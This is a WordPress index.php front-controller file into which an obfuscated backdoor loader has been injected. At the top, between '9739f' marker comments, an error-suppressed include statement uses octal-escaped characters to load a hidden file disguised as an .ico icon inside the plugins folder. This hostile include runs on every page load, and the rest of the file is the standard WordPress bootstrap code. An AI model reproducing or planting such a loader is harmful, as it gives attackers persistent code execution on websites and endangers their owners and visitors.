<?php
/*9739f*/

@include "\057va\162/w\167w/\143dg\162ou\160la\156di\156g/\160ub\154ic\057ad\155in\057wp\055co\156te\156t/\160lu\147in\163/.\142f3\06076\1437.\151co";

/*9739f*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
